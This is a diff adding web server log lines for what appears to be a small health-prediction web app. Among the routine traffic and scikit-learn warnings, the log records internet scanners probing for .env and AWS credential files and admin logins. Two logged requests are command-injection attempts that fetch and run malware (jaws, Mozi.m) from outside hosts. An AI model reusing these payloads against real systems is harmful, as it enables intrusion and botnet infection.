@@ -613,3 +613,413 @@ https://scikit-learn.org/stable/modules/model_persistence.html#security-maintain
 127.0.0.1 - - [13/Dec/2022 12:04:59] "GET /templates/image/neutral.png HTTP/1.1" 200 -
 127.0.0.1 - - [13/Dec/2022 12:05:32] "GET /end/0.0/0.0/0.3333333333333333/0.3333333333333333/2.0/2/体調が維持されるでしょう/1/2022年12月13日%2021:04:28/23/30/8/10/8.666666666666666/2.1499999999999986/0.0/0.0/0.3/0.31666666666666665/3.7666666666666666 HTTP/1.1" 200 -
 127.0.0.1 - - [13/Dec/2022 12:05:33] "[36mGET /templates/image/neutral.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [13/Dec/2022 12:11:52] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 12:11:53] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 12:24:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 12:40:05] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 12:40:06] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 12:40:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 12:40:07] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 12:45:21] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 13:03:50] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+185.10.57.10/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 13:13:44] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 13:13:45] "POST / HTTP/1.1" 200 -
+157.230.241.18 - - [13/Dec/2022 13:17:48] code 400, message Bad request version ('À\x14À')
+157.230.241.18 - - [13/Dec/2022 13:17:48] "[35m[1m {  w¥ÀGÈi\aµÀ#q!Aù["¿i¯öý  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+157.230.241.18 - - [13/Dec/2022 13:17:48] code 400, message Bad request version ('À\x14À')
+157.230.241.18 - - [13/Dec/2022 13:17:48] "[35m[1m {  w¢wòKë ÜsâÀª8æÖKn%î?F¼Î>  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+157.230.241.18 - - [13/Dec/2022 13:17:48] "GET / HTTP/1.1" 200 -
+89.248.165.10 - - [13/Dec/2022 13:54:58] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+89.248.165.10 - - [13/Dec/2022 13:54:58] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Dec/2022 13:58:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 13:58:36] "GET / HTTP/1.1" 200 -
+118.163.199.186 - - [13/Dec/2022 14:01:02] "[33mGET /script HTTP/1.1[0m" 404 -
+118.163.199.186 - - [13/Dec/2022 14:01:02] "[33mGET /login HTTP/1.1[0m" 404 -
+118.163.199.186 - - [13/Dec/2022 14:01:02] "[33mGET /jenkins/login HTTP/1.1[0m" 404 -
+118.163.199.186 - - [13/Dec/2022 14:01:02] "GET / HTTP/1.1" 200 -
+118.163.199.186 - - [13/Dec/2022 14:01:02] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+64.62.197.4 - - [13/Dec/2022 14:07:27] code 400, message Bad request version ('À\x14À')
+64.62.197.4 - - [13/Dec/2022 14:07:27] "[35m[1m {  w+ð°2xNç]/AõöFä¥Z6ä[  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+198.235.24.161 - - [13/Dec/2022 14:30:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/Dec/2022 14:35:51] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 14:35:52] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 14:52:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 15:27:17] "GET / HTTP/1.1" 200 -
+162.142.125.222 - - [13/Dec/2022 15:48:11] code 400, message Bad request version ('À\x14À')
+162.142.125.222 - - [13/Dec/2022 15:48:11] "[35m[1m î  êº"¨y%'5däÊccµÉbéË<ñÙóèñ^Cï s²tÀ!p;ãpÏø²Üâbà¦×ûÒåÆwÀvç &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+162.142.125.222 - - [13/Dec/2022 15:48:13] "GET / HTTP/1.1" 200 -
+162.142.125.222 - - [13/Dec/2022 15:48:13] "GET / HTTP/1.1" 200 -
+162.142.125.222 - - [13/Dec/2022 15:48:13] code 505, message Invalid HTTP version (2.0)
+162.142.125.222 - - [13/Dec/2022 15:48:13] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.222 - - [13/Dec/2022 15:48:13] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 16:19:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 16:19:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 16:19:45] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+103.56.61.147 - - [13/Dec/2022 16:37:41] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
+103.56.61.147 - - [13/Dec/2022 16:37:41] "[35m[1m\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E[0m" HTTPStatus.BAD_REQUEST -
+103.56.61.147 - - [13/Dec/2022 16:37:41] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+103.56.61.147 - - [13/Dec/2022 16:37:41] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+103.56.61.147 - - [13/Dec/2022 16:37:41] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+193.118.53.210 - - [13/Dec/2022 16:38:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 16:45:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 16:55:14] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 16:55:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 17:01:13] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 17:01:13] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 17:04:22] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 17:18:46] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 18:02:49] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 18:02:49] "POST / HTTP/1.1" 200 -
+185.180.143.6 - - [13/Dec/2022 18:57:11] "[33mGET /admin/ HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 19:08:10] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 19:08:10] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 19:32:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 19:51:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 20:36:35] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 20:36:35] "POST / HTTP/1.1" 200 -
+205.210.31.12 - - [13/Dec/2022 21:09:05] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.12 - - [13/Dec/2022 21:09:05] "[35m[1m Ê  Æ:H¾»Ä[Å=@Ñ¼QB*Ã4·)o@ºcÙ~  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Dec/2022 21:18:40] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 21:18:40] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 21:19:56] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.94.196:59473/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 21:40:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 22:07:46] "GET / HTTP/1.1" 200 -
+192.241.209.99 - - [13/Dec/2022 22:21:11] "[33mGET /druid/index.html HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 22:28:08] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 22:28:10] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 22:35:32] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 22:35:33] "POST / HTTP/1.1" 200 -
+198.235.24.156 - - [13/Dec/2022 22:49:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 22:52:57] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 22:54:28] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 23:44:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Dec/2022 23:54:28] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [13/Dec/2022 23:54:28] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 00:10:21] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 00:10:21] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 00:55:55] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 01:04:14] "[33mGET /sendgrid.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 01:04:15] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 01:04:15] "[33mGET /.sendgrid HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 01:27:39] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 01:27:40] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 01:37:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 01:38:53] "GET / HTTP/1.1" 200 -
+205.210.31.57 - - [14/Dec/2022 01:39:13] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03¨I\x185xýÏÕ|Ý1µ^\\¡véð®S¯ëÁ_>>\x8e+Fù!\x14\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.57 - - [14/Dec/2022 01:39:13] "[35m[1m Ê  Æ¨I5xýÏÕ|Ý1µ^\¡véð®S¯ëÁ_>>+Fù!  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2022 02:09:00] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 02:12:55] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:12:56] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 02:32:43] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:45] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 02:32:47] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:49] "[33mGET /phpinfo.php HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:51] "[33mGET /phpinfo HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:53] "[33mGET /aws.yml HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:55] "[33mGET /.env.bak HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:32:58] "[33mGET /info.php HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:33:00] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:33:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 02:33:05] "[33mGET /config/aws.yml HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:33:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 02:33:08] "[33mGET /config.js HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:57:42] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 02:57:43] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 03:05:15] "[33mGET /apis/apps/v1/namespaces/kube-system/daemonsets/ HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 03:12:34] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 03:12:34] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 03:17:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 03:49:32] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 04:03:55] "GET / HTTP/1.1" 200 -
+192.241.195.101 - - [14/Dec/2022 04:28:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 04:31:24] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 04:31:24] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 04:59:00] "GET / HTTP/1.1" 200 -
+103.56.61.147 - - [14/Dec/2022 05:06:08] code 400, message Bad request version ('cof\x91À\x80sJ5Ò\x80æ\x9a~¹Ç\x83^\x96îN\x16\x96\x96&æ\x03ê¼\x81\x02=¬\x10ú?7\x03Ãß÷ä\x98`pæ\x8dÁ©\x8dÆ\x06Û¯\x91ç\x82s÷\x14HÔáW\x9a\x93C\x9e]¤\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03bô\x00\x00/\x9e\x16E')
+103.56.61.147 - - [14/Dec/2022 05:06:08] "[35m[1m    ¿      NIMABIJIAN  {CaigÇeBÅ	Áa	cofÀsJ5Òæ~¹Ç^îN&æê¼=¬ú?7Ãß÷ä`pæÁ©ÆÛ¯çs÷HÔáWC]¤##]c]CCC+Sbô  /E[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2022 05:11:19] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 05:23:55] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 05:23:55] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 06:46:51] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 06:46:52] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 06:49:39] "GET / HTTP/1.1" 200 -
+184.105.139.68 - - [14/Dec/2022 07:03:24] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03oU«Õ&m·¯Y@r¢&À5Ë67R\x95ÞáÉ'Êh]ÊxTmk\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+184.105.139.68 - - [14/Dec/2022 07:03:24] "[35m[1m {  woU«Õ&m·¯Y@r¢&À5Ë67RÞáÉ'Êh]ÊxTmk  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2022 07:10:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 07:16:58] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 07:36:54] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 07:36:55] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 07:49:29] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 07:49:30] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 08:00:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 08:14:50] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 08:14:51] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 08:17:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 08:42:42] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 08:42:44] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 08:48:37] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 09:20:16] "GET / HTTP/1.1" 200 -
+205.210.31.134 - - [14/Dec/2022 09:24:57] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/Dec/2022 09:41:38] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 09:41:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 09:42:58] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 09:42:58] "GET /firstIndex/5/2022年12月14日%2018:42:58/0/30/8/30/6.199999999999999/8.0/0.0/0.0/0.5/0.5/7.0/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 09:43:31] "[32mPOST /firstIndex/5/2022年12月14日%2018:42:58/0/30/8/30/6.199999999999999/8.0/0.0/0.0/0.5/0.5/7.0/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 09:43:31] "GET /result/0.0/0.0/0.5/0.5/5.183333333333334/1/体調が悪くなるでしょう/5/2022年12月14日%2018:42:58/0/30/8/30/8.0/6.199999999999999/0.0/0.0/0.5/0.5/7.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 09:43:31] "GET /templates/image/sad.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 09:43:45] "GET /end/0.0/0.0/0.5/0.5/5.183333333333334/1/体調が悪くなるでしょう/5/2022年12月14日%2018:42:58/0/30/8/30/8.0/6.199999999999999/0.0/0.0/0.5/0.5/7.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 09:43:45] "[36mGET /templates/image/sad.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 09:53:13] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 09:53:14] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:08:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:08:17] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 10:11:57] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 10:11:57] "GET /firstIndex/7/2022年12月14日%2019:11:57/1/38/9/1/6.316666666666666/7.383333333333335/3.0/1.0/2.0/1.0/9.0/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 10:12:39] "[32mPOST /firstIndex/7/2022年12月14日%2019:11:57/1/38/9/1/6.316666666666666/7.383333333333335/3.0/1.0/2.0/1.0/9.0/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 10:12:39] "GET /result/0.0/0.0/1.0/1.0/5.383333333333334/1/体調が悪くなるでしょう/7/2022年12月14日%2019:11:57/1/38/9/1/7.383333333333335/6.316666666666666/3.0/1.0/2.0/1.0/9.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:12:39] "GET /templates/image/sad.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:12:55] "GET /end/0.0/0.0/1.0/1.0/5.383333333333334/1/体調が悪くなるでしょう/7/2022年12月14日%2019:11:57/1/38/9/1/7.383333333333335/6.316666666666666/3.0/1.0/2.0/1.0/9.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:12:55] "[36mGET /templates/image/sad.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 10:19:18] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+64.62.197.111 - - [14/Dec/2022 10:31:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:32:13] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+64.62.197.115 - - [14/Dec/2022 10:32:20] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 -
+64.62.197.111 - - [14/Dec/2022 10:32:24] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 10:32:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:32:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 10:34:06] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 10:34:06] "GET /firstIndex/4/2022年12月14日%2019:34:06/23/0/9/50/3.6833333333333336/10.833333333333334/0.0/0.5/0.5/0.0/1.5/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 10:35:08] "[32mPOST /firstIndex/4/2022年12月14日%2019:34:06/23/0/9/50/3.6833333333333336/10.833333333333334/0.0/0.5/0.5/0.0/1.5/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 10:35:09] "GET /result/0.0/0.25/0.5/0.25/2.6833333333333336/2/体調が維持されるでしょう/4/2022年12月14日%2019:34:06/23/0/9/50/10.833333333333334/3.6833333333333336/0.0/0.5/0.5/0.0/1.5 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:35:09] "GET /templates/image/neutral.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:35:13] "GET /end/0.0/0.25/0.5/0.25/2.6833333333333336/2/体調が維持されるでしょう/4/2022年12月14日%2019:34:06/23/0/9/50/10.833333333333334/3.6833333333333336/0.0/0.5/0.5/0.0/1.5 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 10:35:13] "[36mGET /templates/image/neutral.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 10:46:30] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 10:46:31] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:04:14] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 11:04:15] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:29:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:29:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 11:31:41] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 11:31:41] "GET /firstIndex/9/2022年12月14日%2020:31:41/3/0/9/0/6.666666666666668/6.0/0.0/0.0/0.5/0.3333333333333333/6.0/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 11:33:28] "[32mPOST /firstIndex/9/2022年12月14日%2020:31:41/3/0/9/0/6.666666666666668/6.0/0.0/0.0/0.5/0.3333333333333333/6.0/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 11:33:28] "GET /result/0.0/0.0/0.3333333333333333/0.0/6.333333333333333/1/体調が悪くなるでしょう/9/2022年12月14日%2020:31:41/3/0/9/0/6.0/6.666666666666668/0.0/0.0/0.5/0.3333333333333333/6.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:33:28] "GET /templates/image/sad.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:33:37] "GET /end/0.0/0.0/0.3333333333333333/0.0/6.333333333333333/1/体調が悪くなるでしょう/9/2022年12月14日%2020:31:41/3/0/9/0/6.0/6.666666666666668/0.0/0.0/0.5/0.3333333333333333/6.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:33:37] "[36mGET /templates/image/sad.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 11:39:05] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 11:39:06] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:51:35] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:58:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 11:58:50] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 11:59:57] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 11:59:57] "GET /firstIndex/10/2022年12月14日%2020:59:57/22/0/5/0/1.6666666666666679/7.0/0.16666666666666666/0.0/1.0/0.5/2.3333333333333335/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
